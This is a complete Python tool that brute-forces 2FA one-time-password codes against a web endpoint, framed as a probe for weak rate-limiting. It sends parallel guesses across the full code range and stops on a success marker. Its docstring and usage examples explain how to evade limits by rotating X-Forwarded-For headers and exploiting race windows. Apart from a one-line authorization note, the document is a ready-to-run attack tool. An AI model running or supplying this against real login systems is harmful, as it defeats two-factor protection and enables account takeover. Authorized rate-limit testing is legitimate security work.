#!/usr/bin/env python3
"""
otp-bruteforce.py — probe a 2FA / OTP endpoint for weak rate-limiting.

Common bugs this surfaces:
  - no rate limit at all (just hammer 000000..999999)
  - rate limit by IP but not account → rotate X-Forwarded-For
  - rate limit by account but response leaks "correct code was X"
  - race window where multiple parallel reqs each count as 1 against the budget

Only use against systems you have authorization to test.

usage examples:
  otp-bruteforce.py --url 'http://target/2fa' --method POST \
      --data '{"email":"u@u","otp":CODE}' --match-success '"ok":true' --digits 6
  otp-bruteforce.py --url 'http://target/2fa' --header 'X-Forwarded-For: 10.0.0.CODE' \
      --match-fail 'rate limit' --digits 4

If --match-success is given, stop on match. Otherwise stop on anything that
*doesn't* look like --match-fail.
"""
import argparse, concurrent.futures as cf, itertools, sys, time
import urllib.request, urllib.error


def send(args, code: str) -> tuple[int, str]:
    url  = args.url.replace("CODE", code)
    data = args.data.replace("CODE", code).encode() if args.data else None
    hdrs = {}
    for h in args.header or []:
        h2 = h.replace("CODE", code)
        k, _, v = h2.partition(":")
        hdrs[k.strip()] = v.strip()
    req = urllib.request.Request(url, data=data, headers=hdrs, method=args.method)
    try:
        with urllib.request.urlopen(req, timeout=args.timeout) as r:
            return r.status, r.read(4096).decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(4096).decode(errors="replace")
    except Exception as e:
        return -1, str(e)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True, help="URL (use CODE as placeholder)")
    ap.add_argument("--method", default="POST")
    ap.add_argument("--data", default="")
    ap.add_argument("--header", action="append")
    ap.add_argument("--digits", type=int, default=6)
    ap.add_argument("--start", default="0")
    ap.add_argument("--end",   default=None)
    ap.add_argument("--parallel", type=int, default=10)
    ap.add_argument("--timeout", type=float, default=5)
    ap.add_argument("--match-success", help="treat response containing this as a hit; stop")
    ap.add_argument("--match-fail", default="", help="normal response marker — anything else is interesting")
    ap.add_argument("--delay", type=float, default=0, help="per-request delay (serial mode only)")
    args = ap.parse_args()

    start = int(args.start)
    end   = int(args.end) if args.end else 10 ** args.digits
    codes = (str(i).zfill(args.digits) for i in range(start, end))

    tried = 0
    t0 = time.time()
    with cf.ThreadPoolExecutor(max_workers=args.parallel) as ex:
        fut2code = {ex.submit(send, args, c): c for c in itertools.islice(codes, args.parallel * 10)}
        try:
            while fut2code:
                for fut in cf.as_completed(list(fut2code), timeout=args.timeout + 2):
                    code = fut2code.pop(fut)
                    tried += 1
                    status, body = fut.result()
                    hit = False
                    if args.match_success and args.match_success in body:
                        hit = True
                    elif not args.match_success and args.match_fail and args.match_fail not in body:
                        hit = True
                    if hit:
                        print(f"\nHIT  code={code}  status={status}\n{body[:400]}")
                        return
                    if tried % 50 == 0:
                        rate = tried / (time.time() - t0 + 1e-9)
                        print(f"\r  tried={tried}  rate={rate:.1f}/s  last={code} status={status}", end="", flush=True)
                    nxt = next(codes, None)
                    if nxt is not None:
                        fut2code[ex.submit(send, args, nxt)] = nxt
                    break
        except KeyboardInterrupt:
            print("\n[!] interrupted")
    print(f"\n[*] done. tried {tried} codes.")


if __name__ == "__main__":
    main()
